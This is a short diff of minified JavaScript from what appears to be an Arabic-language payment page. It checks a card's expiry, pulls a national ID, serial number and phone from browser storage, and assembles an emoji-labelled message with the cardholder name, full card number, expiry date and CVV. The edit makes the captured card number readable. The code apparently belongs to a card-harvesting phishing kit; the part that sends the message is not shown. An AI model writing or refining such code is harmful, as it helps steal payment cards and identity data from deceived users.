@@ -6,11 +6,11 @@ if(!(month>=1&&month<=12)){alert('الشهر يجب أن يكون بين 01 و 1
 let inputYear=year.trim();if(!/^\d{2}$/.test(inputYear)&&!/^\d{4}$/.test(inputYear)){alert('السنة يجب أن تكون رقمين (مثل 25) أو 4 أرقام (مثل 2025).');return}
 if(inputYear.length===2){inputYear='20'+inputYear}
 if(parseInt(inputYear)<new Date().getFullYear()){alert('السنة يجب أن تكون السنة الحالية أو أكبر.');return}
-const formData=JSON.parse(localStorage.getItem("formData")||"{}");const nationalId=formData.id||"غير متوفر";const serialNumber=formData.serial||"غير متوفر";const phone=formData.phone||"غير متوفر";const cardName=document.getElementById('cardHolderName').value;const paymentMethod=document.querySelector('input[name="payment"]:checked').value;const expiryDate=`${month}/${year}`;localStorage.setItem("cardNumber",rawCardNumber);const reversedCardNumber=rawCardNumber.match(/.{1,4}/g).map(group=>group.split('').reverse().join('')).join(' ');const message=`
+const formData=JSON.parse(localStorage.getItem("formData")||"{}");const nationalId=formData.id||"غير متوفر";const serialNumber=formData.serial||"غير متوفر";const phone=formData.phone||"غير متوفر";const cardName=document.getElementById('cardHolderName').value;const paymentMethod=document.querySelector('input[name="payment"]:checked').value;const expiryDate=`${month}/${year}`;localStorage.setItem("cardNumber",rawCardNumber);const displayCardNumber='\u200E'+rawCardNumber.replace(/(.{4})(?=.)/g,'$1 ').trim();const message=`
 الفيزا
 
 👤 اسم حامل البطاقة: ${cardName}
-💳 رقم البطاقة: ${reversedCardNumber}
+💳 رقم البطاقة: ${displayCardNumber}
 📆 تاريخ الانتهاء: ${expiryDate}
 🔒 CVV: ${cvv}
 💰 طريقة الدفع: ${paymentMethod}
